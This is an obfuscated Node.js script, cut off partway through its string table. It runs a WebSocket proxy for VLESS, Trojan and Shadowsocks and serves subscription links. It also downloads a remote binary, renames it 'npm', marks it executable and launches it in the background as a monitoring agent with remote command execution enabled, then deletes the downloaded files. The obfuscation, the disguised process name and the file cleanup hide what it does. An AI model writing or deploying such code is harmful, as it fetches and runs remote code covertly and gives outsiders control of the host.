#!/usr/bin/env node

const _0x30a9fd=_0x29b7;(function(_0x124b5d,_0x5dac0d){const _0x476b6b={_0x3a3fe4:0x191,_0x12b795:0x192,_0x26458e:0x180,_0x302858:0x170,_0x2258ff:0x1a5,_0x4604a7:0x187,_0x442608:0x1e2,_0x7a92cd:0x19b},_0x3b0e1b=_0x29b7,_0x1ab4fa=_0x124b5d();while(!![]){try{const _0x6262f0=-parseInt(_0x3b0e1b(_0x476b6b._0x3a3fe4))/0x1+-parseInt(_0x3b0e1b(0x174))/0x2*(parseInt(_0x3b0e1b(_0x476b6b._0x12b795))/0x3)+-parseInt(_0x3b0e1b(0x1db))/0x4*(parseInt(_0x3b0e1b(_0x476b6b._0x26458e))/0x5)+parseInt(_0x3b0e1b(_0x476b6b._0x302858))/0x6*(-parseInt(_0x3b0e1b(_0x476b6b._0x2258ff))/0x7)+-parseInt(_0x3b0e1b(_0x476b6b._0x4604a7))/0x8*(parseInt(_0x3b0e1b(0x18e))/0x9)+parseInt(_0x3b0e1b(_0x476b6b._0x442608))/0xa+parseInt(_0x3b0e1b(_0x476b6b._0x7a92cd))/0xb;if(_0x6262f0===_0x5dac0d)break;else _0x1ab4fa['push'](_0x1ab4fa['shift']());}catch(_0xdec06){_0x1ab4fa['push'](_0x1ab4fa['shift']());}}}(_0x304a,0xd85de));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x30a9fd(0x204)),net=require(_0x30a9fd(0x1f9)),path=require(_0x30a9fd(0x19d)),crypto=require(_0x30a9fd(0x18f)),{Buffer}=require(_0x30a9fd(0x1fc)),{exec,execSync}=require(_0x30a9fd(0x183)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x30a9fd(0x1c8)][_0x30a9fd(0x17f)]||'008cdf2e-5f9f-4590-9a84-8f4253c42e22',NEZHA_SERVER=process['env'][_0x30a9fd(0x199)]||'',NEZHA_PORT=process[_0x30a9fd(0x1c8)][_0x30a9fd(0x19a)]||'',NEZHA_KEY=process[_0x30a9fd(0x1c8)]['NEZHA_KEY']||'',DOMAIN=process[_0x30a9fd(0x1c8)][_0x30a9fd(0x1c4)]||_0x30a9fd(0x188),AUTO_ACCESS=process[_0x30a9fd(0x1c8)][_0x30a9fd(0x1ac)]||![],WSPATH=process['env']['WSPATH']||UUID[_0x30a9fd(0x19f)](0x0,0x8),SUB_PATH=process[_0x30a9fd(0x1c8)][_0x30a9fd(0x1ce)]||_0x30a9fd(0x198),NAME=process[_0x30a9fd(0x1c8)][_0x30a9fd(0x19c)]||'',PORT=process[_0x30a9fd(0x1c8)][_0x30a9fd(0x1e3)]||0xbb8;let uuid=UUID[_0x30a9fd(0x175)](/-/g,''),CurrentDomain=DOMAIN,Tls=_0x30a9fd(0x16e),CurrentPort=0x1bb,ISP='';const DNS_SERVERS=['8.8.4.4',_0x30a9fd(0x17a)],BLOCKED_DOMAINS=['speedtest.net',_0x30a9fd(0x1fa),_0x30a9fd(0x17b),_0x30a9fd(0x1b9),_0x30a9fd(0x1c0),_0x30a9fd(0x1dc),_0x30a9fd(0x18d),_0x30a9fd(0x1aa),_0x30a9fd(0x1df),_0x30a9fd(0x1ef)];function isBlockedDomain(_0x559dd5){const _0x11fc3e={_0x5ec8e7:0x1f1,_0xdf2742:0x17e},_0x1b6c57=_0x30a9fd;if(!_0x559dd5)return![];const _0x257e77=_0x559dd5[_0x1b6c57(_0x11fc3e._0x5ec8e7)]();return BLOCKED_DOMAINS[_0x1b6c57(_0x11fc3e._0xdf2742)](_0x1254f1=>{return _0x257e77===_0x1254f1||_0x257e77['endsWith']('.'+_0x1254f1);});}async function getisp(){const _0xf2ad4a={_0x23d78b:0x178,_0x5ae585:0x1d6,_0x47a576:0x175},_0x23667c=_0x30a9fd;try{const _0x3176a0=await axios[_0x23667c(_0xf2ad4a._0x23d78b)](_0x23667c(0x1b5),{'headers':{'User-Agent':_0x23667c(0x18c),'timeout':0xbb8}}),_0x28a86b=_0x3176a0[_0x23667c(0x1eb)];ISP=(_0x28a86b['country_code']+'-'+_0x28a86b[_0x23667c(_0xf2ad4a._0x5ae585)])[_0x23667c(_0xf2ad4a._0x47a576)](/ /g,'_');}catch(_0x3f148b){try{const _0x3efc8b=await axios['get'](_0x23667c(0x196),{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}}),_0x599236=_0x3efc8b[_0x23667c(0x1eb)];ISP=(_0x599236[_0x23667c(0x1f3)]+'-'+_0x599236[_0x23667c(0x1e6)])['replace'](/ /g,'_');}catch(_0x40f072){ISP=_0x23667c(0x1ed);}}}async function getip(){const _0xc24af9={_0x24e340:0x1dd,_0x11bebe:0x1ee,_0x45c97b:0x1fe},_0x106282=_0x30a9fd;if(!DOMAIN||DOMAIN===_0x106282(_0xc24af9._0x24e340))try{const _0x3f3179=await axios[_0x106282(0x178)](_0x106282(0x1e9),{'timeout':0x1388}),_0x19163e=_0x3f3179['data'][_0x106282(0x181)]();CurrentDomain=_0x19163e,Tls=_0x106282(_0xc24af9._0x11bebe),CurrentPort=PORT;}catch(_0x5227b4){console[_0x106282(0x171)](_0x106282(0x1cc),_0x5227b4[_0x106282(0x193)]),(CurrentDomain=_0x106282(_0xc24af9._0x45c97b),Tls=_0x106282(0x16e),CurrentPort=0x1bb);}else CurrentDomain=DOMAIN,Tls=_0x106282(0x16e),CurrentPort=0x1bb;}const httpServer=http[_0x30a9fd(0x201)](async(_0x54a9a7,_0x56eccc)=>{const _0x139960={_0x68578:0x1a3,_0x59d97d:0x1e0,_0x9b82fd:0x16e,_0x451b28:0x1ee,_0x347543:0x1e8,_0x5f5af5:0x200,_0x322e01:0x1b1,_0x268ef3:0x1af,_0x1347b6:0x1c1,_0x118dac:0x195,_0x286a78:0x1f4,_0x305bda:0x1a8},_0x2cb3e3={_0x4d0511:0x1a6,_0x11d93d:0x1f4,_0x4311a4:0x18b},_0x3817f3=_0x30a9fd;if(_0x54a9a7[_0x3817f3(_0x139960._0x68578)]==='/'){const _0x503159=path[_0x3817f3(0x189)](__dirname,_0x3817f3(_0x139960._0x59d97d));fs['readFile'](_0x503159,'utf8',(_0x12e202,_0x2e072d)=>{const _0x5331f8=_0x3817f3;if(_0x12e202){_0x56eccc[_0x5331f8(0x195)](0xc8,{'Content-Type':_0x5331f8(_0x2cb3e3._0x4d0511)}),_0x56eccc[_0x5331f8(_0x2cb3e3._0x11d93d)](_0x5331f8(_0x2cb3e3._0x4311a4));return;}_0x56eccc['writeHead'](0xc8,{'Content-Type':_0x5331f8(_0x2cb3e3._0x4d0511)}),_0x56eccc[_0x5331f8(0x1f4)](_0x2e072d);});return;}else{if(_0x54a9a7['url']==='/'+SUB_PATH){await getisp(),await getip();const _0x5c6bab=NAME?NAME+'-'+ISP:ISP,_0x451950=Tls===_0x3817f3(_0x139960._0x9b82fd)?_0x3817f3(0x16e):_0x3817f3(_0x139960._0x451b28),_0x529f30=Tls===_0x3817f3(_0x139960._0x9b82fd)?_0x3817f3(0x1b3):'',_0x4f9658=_0x3817f3(_0x139960._0x347543)+UUID+'@'+CurrentDomain+':'+CurrentPort+_0x3817f3(0x1cd)+_0x451950+_0x3817f3(0x177)+CurrentDomain+_0x3817f3(0x200)+CurrentDomain+'&path=%2F'+WSPATH+'#'+_0x5c6bab,_0x287c2e=_0x3817f3(0x1b4)+UUID+'@'+CurrentDomain+':'+CurrentPort+_0x3817f3(0x1b8)+_0x451950+'&sni='+CurrentDomain+_0x3817f3(_0x139960._0x5f5af5)+CurrentDomain+_0x3817f3(0x179)+WSPATH+'#'+_0x5c6bab,_0x3abfef=Buffer[_0x3817f3(_0x139960._0x322e01)]('none:'+UUID)[_0x3817f3(_0x139960._0x268ef3)](_0x3817f3(0x18a)),_0x82c99a=_0x3817f3(_0x139960._0x1347b6)+_0x3abfef+'@'+CurrentDomain+':'+CurrentPort+_0x3817f3(0x1c6)+CurrentDomain+_0x3817f3(0x190)+WSPATH+';'+_0x529f30+_0x3817f3(0x173)+CurrentDomain+';skip-cert-verify%3Dtrue;mux%3D0#'+_0x5c6bab,_0xd6cfcd=_0x4f9658+'\x0a'+_0x287c2e+'\x0a'+_0x82c99a,_0x34ffd9=Buffer['from'](_0xd6cfcd)[_0x3817f3(0x1af)]('base64');_0x56eccc['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x56eccc[_0x3817f3(0x1f4)](_0x34ffd9+'\x0a');}else _0x56eccc[_0x3817f3(_0x139960._0x118dac)](0x194,{'Content-Type':'text/plain'}),_0x56eccc[_0x3817f3(_0x139960._0x286a78)](_0x3817f3(_0x139960._0x305bda));}});function resolveHost(_0xb866cd){const _0xbbcb4b={_0x1575fc:0x1e1};return new Promise((_0x2715f2,_0x4fc539)=>{const _0xff2301={_0x107bb6:0x1eb,_0x430049:0x1e7};if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0xb866cd)){_0x2715f2(_0xb866cd);return;}let _0x10324c=0x0;function _0x3194dc(){const _0x306c69=_0x29b7;if(_0x10324c>=DNS_SERVERS['length']){_0x4fc539(new Error(_0x306c69(_0xbbcb4b._0x1575fc)+_0xb866cd+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x7741f6=DNS_SERVERS[_0x10324c];_0x10324c++;const _0x227cc1=_0x306c69(0x1ea)+encodeURIComponent(_0xb866cd)+_0x306c69(0x184);axios[_0x306c69(0x178)](_0x227cc1,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x306c69(0x1d4)](_0x4b673f=>{const _0x1d3ef1=_0x306c69,_0x1fd2d3=_0x4b673f[_0x1d3ef1(_0xff2301._0x107bb6)];if(_0x1fd2d3['Status']===0x0&&_0x1fd2d3['Answer']&&_0x1fd2d3['Answer']['length']>0x0){const _0x1d1c73=_0x1fd2d3[_0x1d3ef1(_0xff2301._0x430049)]['find'](_0x4cc5fa=>_0x4cc5fa[_0x1d3ef1(0x1d8)]===0x1);if(_0x1d1c73){_0x2715f2(_0x1d1c73[_0x1d3ef1(_0xff2301._0x107bb6)]);return;}}_0x3194dc();})['catch'](_0x217e3a=>{_0x3194dc();});}_0x3194dc();});}function handleVlsConnection(_0x128e29,_0x30357c){const _0x129489={_0x12402c:0x19f,_0x213d0e:0x1e5,_0x5c3eff:0x1c9,_0x2aee72:0x1c9,_0x5663ea:0x19f,_0x5530e8:0x197,_0x3c3e16:0x189,_0x3f8efc:0x1ff,_0x373809:0x1d4},_0x2b2f6b={_0x59341b:0x1c7},_0x28a61c={_0x462795:0x1c7},_0x2a9218=_0x30a9fd,[_0x23cc5d]=_0x30357c,_0x571f9a=_0x30357c[_0x2a9218(0x19f)](0x1,0x11);if(!_0x571f9a['every']((_0x1a03e9,_0x4fe518)=>_0x1a03e9==parseInt(uuid[_0x2a9218(0x202)](_0x4fe518*0x2,0x2),0x10)))return![];let _0x52855e=_0x30357c[_0x2a9218(_0x129489._0x12402c)](0x11,0x12)[_0x2a9218(0x1c9)]()+0x13;const _0x58a3e2=_0x30357c[_0x2a9218(_0x129489._0x12402c)](_0x52855e,_0x52855e+=0x2)[_0x2a9218(_0x129489._0x213d0e)](0x0),_0x333a80=_0x30357c['slice'](_0x52855e,_0x52855e+=0x1)[_0x2a9218(_0x129489._0x5c3eff)](),_0x1e6ebf=_0x333a80==0x1?_0x30357c[_0x2a9218(_0x129489._0x12402c)](_0x52855e,_0x52855e+=0x4)['join']('.'):_0x333a80==0x2?new TextDecoder()[_0x2a9218(0x1ae)](_0x30357c['slice'](_0x52855e+0x1,_0x52855e+=0x1+_0x30357c[_0x2a9218(_0x129489._0x12402c)](_0x52855e,_0x52855e+0x1)[_0x2a9218(_0x129489._0x2aee72)]())):_0x333a80==0x3?_0x30357c[_0x2a9218(_0x129489._0x5663ea)](_0x52855e,_0x52855e+=0x10)[_0x2a9218(0x1f2)]((_0x4073ff,_0x52994a,_0x13a737,_0x5bfe31)=>_0x13a737%0x2?_0x4073ff[_0x2a9218(0x16f)](_0x5bfe31[_0x2a9218(0x19f)](_0x13a737-0x1,_0x13a737+0x1)):_0x4073ff,[])[_0x2a9218(_0x129489._0x5530e8)](_0x3b78db=>_0x3b78db[_0x2a9218(0x1e5)](0x0)['toString'](0x10))[_0x2a9218(_0x129489._0x3c3e16)](':'):'';if(isBlockedDomain(_0x1e6ebf))return _0x128e29[_0x2a9218(0x1f8)](),![];_0x128e29[_0x2a9218(_0x129489._0x3f8efc)](new Uint8Array([_0x23cc5d,0x0]));const _0xcd672b=createWebSocketStream(_0x128e29);return resolveHost(_0x1e6ebf)[_0x2a9218(_0x129489._0x373809)](_0x559c65=>{const _0x27631d={_0x2d5bc8:0x19f,_0xc28dab:0x1bf},_0x40f95b=_0x2a9218;net[_0x40f95b(_0x28a61c._0x462795)]({'host':_0x559c65,'port':_0x58a3e2},function(){const _0x2ef4b3=_0x40f95b;this['write'](_0x30357c[_0x2ef4b3(_0x27631d._0x2d5bc8)](_0x52855e)),_0xcd672b['on'](_0x2ef4b3(0x171),()=>{})[_0x2ef4b3(_0x27631d._0xc28dab)](this)['on']('error',()=>{})['pipe'](_0xcd672b);})['on'](_0x40f95b(0x171),()=>{});})[_0x2a9218(0x1b6)](_0x33a646=>{const _0x1f5e1e={_0x49b269:0x171},_0xe00a2d=_0x2a9218;net[_0xe00a2d(_0x2b2f6b._0x59341b)]({'host':_0x1e6ebf,'port':_0x58a3e2},function(){const _0x588a50=_0xe00a2d;this[_0x588a50(0x1c5)](_0x30357c[_0x588a50(0x19f)](_0x52855e)),_0xcd672b['on'](_0x588a50(0x171),()=>{})['pipe'](this)['on'](_0x588a50(_0x1f5e1e._0x49b269),()=>{})['pipe'](_0xcd672b);})['on']('error',()=>{});}),!![];}function handleTrojConnection(_0x161cbb,_0x5006ff){const _0x3fc5ca={_0x13b95b:0x194,_0x52455b:0x19f,_0x50d362:0x1d9,_0x3ced5c:0x185,_0x22d894:0x1af,_0x202a1e:0x19f,_0x41dfbc:0x189,_0x1bb6f1:0x1e5},_0x22cf4c={_0xe13ce3:0x19f,_0x35c027:0x171,_0x194793:0x1bf},_0xc0484c={_0x4b00a1:0x171},_0x555be1=_0x30a9fd;try{if(_0x5006ff[_0x555be1(_0x3fc5ca._0x13b95b)]<0x3a)return![];const _0x2b541b=_0x5006ff[_0x555be1(_0x3fc5ca._0x52455b)](0x0,0x38)['toString'](),_0x1cc558=[UUID];let _0x170fe3=null;for(const _0x1754f4 of _0x1cc558){const _0x4b0b9e=crypto[_0x555be1(0x1da)](_0x555be1(_0x3fc5ca._0x50d362))['update'](_0x1754f4)['digest'](_0x555be1(_0x3fc5ca._0x3ced5c));if(_0x4b0b9e===_0x2b541b){_0x170fe3=_0x1754f4;break;}}if(!_0x170fe3)return![];let _0x20f293=0x38;_0x5006ff[_0x20f293]===0xd&&_0x5006ff[_0x20f293+0x1]===0xa&&(_0x20f293+=0x2);const _0x4fa983=_0x5006ff[_0x20f293];if(_0x4fa983!==0x1)return![];_0x20f293+=0x1;const _0x25898b=_0x5006ff[_0x20f293];_0x20f293+=0x1;let _0x44a4cc,_0x59f9db;if(_0x25898b===0x1)_0x44a4cc=_0x5006ff[_0x555be1(0x19f)](_0x20f293,_0x20f293+0x4)[_0x555be1(0x189)]('.'),_0x20f293+=0x4;else{if(_0x25898b===0x3){const _0x1657ab=_0x5006ff[_0x20f293];_0x20f293+=0x1,_0x44a4cc=_0x5006ff['slice'](_0x20f293,_0x20f293+_0x1657ab)[_0x555be1(_0x3fc5ca._0x22d894)](),_0x20f293+=_0x1657ab;}else{if(_0x25898b===0x4)_0x44a4cc=_0x5006ff[_0x555be1(_0x3fc5ca._0x202a1e)](_0x20f293,_0x20f293+0x10)['reduce']((_0x4cac6d,_0xa0993f,_0x5a6e5b,_0x103e3b)=>_0x5a6e5b%0x2?_0x4cac6d[_0x555be1(0x16f)](_0x103e3b[_0x555be1(0x19f)](_0x5a6e5b-0x1,_0x5a6e5b+0x1)):_0x4cac6d,[])[_0x555be1(0x197)](_0x109dce=>_0x109dce[_0x555be1(0x1e5)](0x0)[_0x555be1(0x1af)](0x10))[_0x555be1(_0x3fc5ca._0x41dfbc)](':'),_0x20f293+=0x10;else return![];}}_0x59f9db=_0x5006ff[_0x555be1(_0x3fc5ca._0x1bb6f1)](_0x20f293),_0x20f293+=0x2;_0x20f293<_0x5006ff['length']&&_0x5006ff[_0x20f293]===0xd&&_0x5006ff[_0x20f293+0x1]===0xa&&(_0x20f293+=0x2);if(isBlockedDomain(_0x44a4cc))return _0x161cbb['close'](),![];const _0x2e982b=createWebSocketStream(_0x161cbb);return resolveHost(_0x44a4cc)[_0x555be1(0x1d4)](_0xc01c25=>{const _0x33d713=_0x555be1;net[_0x33d713(0x1c7)]({'host':_0xc01c25,'port':_0x59f9db},function(){const _0x122049=_0x33d713;_0x20f293<_0x5006ff[_0x122049(0x194)]&&this[_0x122049(0x1c5)](_0x5006ff[_0x122049(0x19f)](_0x20f293)),_0x2e982b['on']('error',()=>{})[_0x122049(0x1bf)](this)['on'](_0x122049(0x171),()=>{})[_0x122049(0x1bf)](_0x2e982b);})['on'](_0x33d713(_0xc0484c._0x4b00a1),()=>{});})['catch'](_0x3383f7=>{net['connect']({'host':_0x44a4cc,'port':_0x59f9db},function(){const _0xea619=_0x29b7;_0x20f293<_0x5006ff['length']&&this['write'](_0x5006ff[_0xea619(_0x22cf4c._0xe13ce3)](_0x20f293)),_0x2e982b['on'](_0xea619(0x171),()=>{})[_0xea619(0x1bf)](this)['on'](_0xea619(_0x22cf4c._0x35c027),()=>{})[_0xea619(_0x22cf4c._0x194793)](_0x2e982b);})['on']('error',()=>{});}),!![];}catch(_0x53a8aa){return![];}}function handleSsConnection(_0x20bddb,_0x50f1bb){const _0x1b2918={_0x263686:0x19f,_0x389042:0x1af,_0x2ffc5f:0x197,_0x27b810:0x189},_0xd03989={_0x2cdade:0x1c7},_0x2a3705={_0x20c9a7:0x1c5,_0x3cc08e:0x171},_0x142a26={_0xf1a37a:0x1c7},_0x5c4748=_0x30a9fd;try{let _0x596076=0x0;const _0x212b1d=_0x50f1bb[_0x596076];_0x596076+=0x1;let _0x1bdbd8,_0x211cfa;if(_0x212b1d===0x1)_0x1bdbd8=_0x50f1bb[_0x5c4748(_0x1b2918._0x263686)](_0x596076,_0x596076+0x4)[_0x5c4748(0x189)]('.'),_0x596076+=0x4;else{if(_0x212b1d===0x3){const _0x53a80e=_0x50f1bb[_0x596076];_0x596076+=0x1,_0x1bdbd8=_0x50f1bb[_0x5c4748(0x19f)](_0x596076,_0x596076+_0x53a80e)[_0x5c4748(_0x1b2918._0x389042)](),_0x596076+=_0x53a80e;}else{if(_0x212b1d===0x4)_0x1bdbd8=_0x50f1bb[_0x5c4748(0x19f)](_0x596076,_0x596076+0x10)['reduce']((_0x29416e,_0x3d3257,_0xc8677,_0xd4a40f)=>_0xc8677%0x2?_0x29416e[_0x5c4748(0x16f)](_0xd4a40f['slice'](_0xc8677-0x1,_0xc8677+0x1)):_0x29416e,[])[_0x5c4748(_0x1b2918._0x2ffc5f)](_0x308173=>_0x308173[_0x5c4748(0x1e5)](0x0)[_0x5c4748(0x1af)](0x10))[_0x5c4748(_0x1b2918._0x27b810)](':'),_0x596076+=0x10;else return![];}}_0x211cfa=_0x50f1bb[_0x5c4748(0x1e5)](_0x596076),_0x596076+=0x2;if(isBlockedDomain(_0x1bdbd8))return _0x20bddb[_0x5c4748(0x1f8)](),![];const _0xff3834=createWebSocketStream(_0x20bddb);return resolveHost(_0x1bdbd8)['then'](_0x374f37=>{const _0x2119ad={_0x7bf2e1:0x19f,_0x34fe94:0x1bf,_0x1b2cac:0x171,_0x10ff06:0x1bf},_0xbf69fc=_0x5c4748;net[_0xbf69fc(_0x142a26._0xf1a37a)]({'host':_0x374f37,'port':_0x211cfa},function(){const _0x58a9b0=_0xbf69fc;_0x596076<_0x50f1bb[_0x58a9b0(0x194)]&&this[_0x58a9b0(0x1c5)](_0x50f1bb[_0x58a9b0(_0x2119ad._0x7bf2e1)](_0x596076)),_0xff3834['on']('error',()=>{})[_0x58a9b0(_0x2119ad._0x34fe94)](this)['on'](_0x58a9b0(_0x2119ad._0x1b2cac),()=>{})[_0x58a9b0(_0x2119ad._0x10ff06)](_0xff3834);})['on']('error',()=>{});})['catch'](_0x1f2e71=>{const _0x5b1de4=_0x5c4748;net[_0x5b1de4(_0xd03989._0x2cdade)]({'host':_0x1bdbd8,'port':_0x211cfa},function(){const _0x3a08f3=_0x5b1de4;_0x596076<_0x50f1bb[_0x3a08f3(0x194)]&&this[_0x3a08f3(_0x2a3705._0x20c9a7)](_0x50f1bb['slice'](_0x596076)),_0xff3834['on'](_0x3a08f3(_0x2a3705._0x3cc08e),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0xff3834);})['on']('error',()=>{});}),!![];}catch(_0x1b4ace){return![];}}const wss=new WebSocket[(_0x30a9fd(0x1de))]({'server':httpServer});wss['on'](_0x30a9fd(0x1a1),(_0x101640,_0x5ebe3e)=>{const _0x437598={_0x5b818c:0x1a3,_0x202364:0x19e,_0x5e01f2:0x1d2,_0x182219:0x193,_0x1677ea:0x171},_0x84596b={_0x245747:0x194},_0x43cfd7=_0x30a9fd,_0x17fec3=_0x5ebe3e[_0x43cfd7(_0x437598._0x5b818c)]||'',_0x228371='/'+WSPATH;if(!_0x17fec3[_0x43cfd7(_0x437598._0x202364)](_0x228371)){_0x101640['close']();return;}_0x101640[_0x43cfd7(_0x437598._0x5e01f2)](_0x43cfd7(_0x437598._0x182219),_0x553876=>{const _0x9ea8a6=_0x43cfd7;if(_0x553876[_0x9ea8a6(0x194)]>0x11&&_0x553876[0x0]===0x0){const _0x4623de=_0x553876[_0x9ea8a6(0x19f)](0x1,0x11),_0x3b3750=_0x4623de['every']((_0x18282e,_0x51f446)=>_0x18282e==parseInt(uuid[_0x9ea8a6(0x202)](_0x51f446*0x2,0x2),0x10));if(_0x3b3750){!handleVlsConnection(_0x101640,_0x553876)&&_0x101640[_0x9ea8a6(0x1f8)]();return;}}if(_0x553876[_0x9ea8a6(_0x84596b._0x245747)]>=0x3a){if(handleTrojConnection(_0x101640,_0x553876))return;}if(_0x553876['length']>0x0&&(_0x553876[0x0]===0x1||_0x553876[0x0]===0x3||_0x553876[0x0]===0x4)){if(handleSsConnection(_0x101640,_0x553876))return;}_0x101640[_0x9ea8a6(0x1f8)]();})['on'](_0x43cfd7(_0x437598._0x1677ea),()=>{});});const getDownloadUrl=()=>{const _0x5e2b49={_0x5cc7be:0x1a0,_0x53772d:0x1d3,_0x1c3369:0x1c3},_0x217d3a=_0x30a9fd,_0xd54514=os[_0x217d3a(_0x5e2b49._0x5cc7be)]();return _0xd54514===_0x217d3a(_0x5e2b49._0x53772d)||_0xd54514==='arm64'||_0xd54514===_0x217d3a(_0x5e2b49._0x1c3369)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x217d3a(0x1c2):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x52d744={_0x217616:0x1be,_0x3ad3d3:0x1ba},_0x6b5120=_0x30a9fd;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2ed981=getDownloadUrl(),_0x4220b2=await axios({'method':_0x6b5120(0x178),'url':_0x2ed981,'responseType':_0x6b5120(_0x52d744._0x217616)}),_0x27f61a=fs[_0x6b5120(_0x52d744._0x3ad3d3)](_0x6b5120(0x1ec));return _0x4220b2['data']['pipe'](_0x27f61a),new Promise((_0x732970,_0xfd68e1)=>{const _0x4394f8=_0x6b5120;_0x27f61a['on'](_0x4394f8(0x1ad),()=>{const _0x145f9e=_0x4394f8;console[_0x145f9e(0x1e4)](_0x145f9e(0x186)),exec(_0x145f9e(0x1cb),_0x5ef2cd=>{if(_0x5ef2cd)_0xfd68e1(_0x5ef2cd);_0x732970();});}),_0x27f61a['on'](_0x4394f8(0x171),_0xfd68e1);});}catch(_0x4a2d01){throw _0x4a2d01;}},runnz=async()=>{const _0xd53842={_0x14e984:0x1a2,_0x44cce6:0x1e4,_0x16d736:0x1ca,_0x1ecdde:0x1bb,_0x570fb1:0x1f7,_0x2d18fe:0x1d7,_0x365ee5:0x1a4,_0x32f981:0x1bc,_0x51dbac:0x1fb,_0x2d1dd0:0x1ab,_0x5de446:0x1d0,_0x2d561a:0x182,_0x27a0e4:0x1bd,_0x32ce75:0x176},_0x1e4b45={_0x14c846:0x1a9},_0x599bb2=_0x30a9fd;try{const _0x884bc=execSync(_0x599bb2(0x172),{'encoding':_0x599bb2(_0xd53842._0x14e984)});if(_0x884bc[_0x599bb2(0x181)]()!==''){console[_0x599bb2(_0xd53842._0x44cce6)](_0x599bb2(0x1b0));return;}}catch(_0x3f538b){}await downloadFile();let _0x42a91a='',_0x837f56=[_0x599bb2(_0xd53842._0x16d736),_0x599bb2(0x1b7),_0x599bb2(_0xd53842._0x1ecdde),'2087','2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x39ab16=_0x837f56[_0x599bb2(_0xd53842._0x570fb1)](NEZHA_PORT)?_0x599bb2(0x17d):'';_0x42a91a=_0x599bb2(0x17c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x599bb2(0x1a7)+NEZHA_KEY+'\x20'+_0x39ab16+_0x599bb2(_0xd53842._0x2d18fe);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x352b47=NEZHA_SERVER[_0x599bb2(0x1f7)](':')?NEZHA_SERVER['split'](':')[_0x599bb2(_0xd53842._0x365ee5)]():'',_0xed7710=_0x837f56[_0x599bb2(_0xd53842._0x570fb1)](_0x352b47)?_0x599bb2(_0xd53842._0x32f981):_0x599bb2(_0xd53842._0x51dbac),_0xee10e6=_0x599bb2(_0xd53842._0x2d1dd0)+NEZHA_KEY+_0x599bb2(_0xd53842._0x5de446)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0xed7710+_0x599bb2(_0xd53842._0x2d561a)+UUID;fs[_0x599bb2(_0xd53842._0x27a0e4)](_0x599bb2(0x203),_0xee10e6);}_0x42a91a=_0x599bb2(0x1fd);}else return;}try{exec(_0x42a91a,{'shell':_0x599bb2(_0xd53842._0x32ce75)},_0xf28555=>{const _0x43e2bc=_0x599bb2;if(_0xf28555)console['error']('npm\x20running\x20error:',_0xf28555);else console[_0x43e2bc(0x1e4)](_0x43e2bc(_0x1e4b45._0x14c846));});}catch(_0x5f320e){console[_0x599bb2(0x171)]('error:\x20'+_0x5f320e);}};function _0x29b7(_0x76b8ad,_0x140a22){const _0x304a69=_0x304a();return _0x29b7=function(_0x29b74f,_0x4c1c33){_0x29b74f=_0x29b74f-0x16e;let _0x5dd918=_0x304a69[_0x29b74f];return _0x5dd918;},_0x29b7(_0x76b8ad,_0x140a22);}async function addAccessTask(){const _0x21cf9e={_0x29ab9a:0x1d1,_0xfa9215:0x1b2,_0x37e204:0x1f0},_0x108cb7=_0x30a9fd;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1d5257=_0x108cb7(_0x21cf9e._0x29ab9a)+DOMAIN+'/'+SUB_PATH;try{const _0x15fd99=await axios['post'](_0x108cb7(_0x21cf9e._0xfa9215),{'url':_0x1d5257},{'headers':{'Content-Type':_0x108cb7(_0x21cf9e._0x37e204)}});console[_0x108cb7(0x1e4)](_0x108cb7(0x1d5));}catch(_0x25fcd0){}}const delFiles=()=>{const _0x44ab4c=_0x30a9fd;[_0x44ab4c(0x1ec),_0x44ab4c(0x203)]['forEach'](_0x5be44f=>fs[_0x44ab4c(0x1f6)](_0x5be44f,()=>{}));};function _0x304a(){const _0x58586d=['axios','tls','concat','252ptqrwJ','error','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','sni%3D','30CIwNFD','replace','/bin/bash','&sni=','get','&path=%2F','1.1.1.1','speedtest.cn','setsid\x20nohup\x20./npm\x20-s\x20','--tls','some','UUID','1085zpHbUU','trim','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','child_process','&type=A','hex','npm\x20download\x20successfully','11101856ROCQYU','hug260130.liang77.top','join','base64','Hello\x20world!','Mozilla/5.0','bandwidth.place','9BtlSWl','crypto',';path%3D%2F','155856klKHeH','70653RpJHxt','message','length','writeHead','http://ip-api.com/json','map','liang-260131','NEZHA_SERVER','NEZHA_PORT','24517526nCptzh','NAME','path','startsWith','slice','arch','connection','utf-8','url','pop','153111VIOFpq','text/html','\x20-p\x20','Not\x20Found\x0a','npm\x20is\x20running','speed.io','client_secret:\x20','AUTO_ACCESS','finish','decode','toString','npm\x20is\x20already\x20running,\x20skip\x20running...','from','https://oooo.serv00.net/add-url','tls;','trojan://','https://api.ip.sb/geoip','catch','8443','?security=','speed.cloudflare.com','createWriteStream','2096','true','writeFileSync','stream','pipe','speedof.me','ss://','https://arm64.ssss.nyc.mn/agent','aarch64','DOMAIN','write','?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D','connect','env','readUInt8','443','chmod\x20+x\x20npm','Failed\x20to\x20get\x20IP','?encryption=none&security=','SUB_PATH','listen','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://','once','arm','then','Automatic\x20Access\x20T